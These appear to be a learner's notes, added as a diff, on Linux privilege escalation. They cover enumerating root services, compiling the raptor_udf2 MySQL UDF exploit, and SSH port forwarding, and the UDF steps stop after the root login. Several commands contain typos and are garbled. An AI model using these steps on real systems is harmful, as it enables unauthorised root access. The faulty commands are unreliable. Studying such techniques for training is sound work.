@@ -1,0 +1,87 @@
+----------------------------------------------
+SERVICE EXPLOITS
+
+this command will show all processes that are running as root:
+ps aux | grep "^root"
+
+Enumerating program versions:
+
+Running the program with the --version/-v command line options often shows the version number:
+program --version
+program -v
+
+on debian like distributions dpkg can show installed programs and their versions:
+dpkg -l | grep <program>
+
+on systems that use rpm, the following achieves the same:
+rpm -qa | grep <program>
+
+to see services running as root use this command:
+ps aux | "^root"
+
+EXAMPLE 
+on the target machine we were able to figure out that the mysql proccess was running as root we figured this out with 
+by running the ./lse.sh script
+
+lse.sh -l 1
+
+next we figured out the version of mysqld running with this command"
+mysqld --version 
+
+EXAMPLE CONTINUED UDF EXPLOIT COMMANDS:
+*gcc note he says since we are using the 64 bit debian distro we need to provide the -fPIC option
+exploit says use this command: gcc -g -c raptor_udf2.c
+but we have to change it to this: gcc -g -c raptor_udf2.c -fPIC
+
+first we have to compile the exploit with command:
+gcc -g -c raptor_udf2.c
+
+next we need to create a shared object from the compiled exploit:
+gcc -g -shared -WL, -soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.0 -lc 
+
+next we need to connect to mysql as the root user:
+mysql -u root -p
+
+PORT FORWARDING
+in some instances a root process may be bound to an internal port, through which it communicates.
+
+if for some reason an exploit cannot run locally on the target machine, the port can be forwarded 
+using ssh to your local machine with command:
+
+ssh -R <local-port>:127.0.0.1:<service-port> <username>@,local-machine>
+
+the exploit code can now be run on your local machine at whichever port you choose
+---------------------------------
+WEAK FILE PERMISSIONS
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
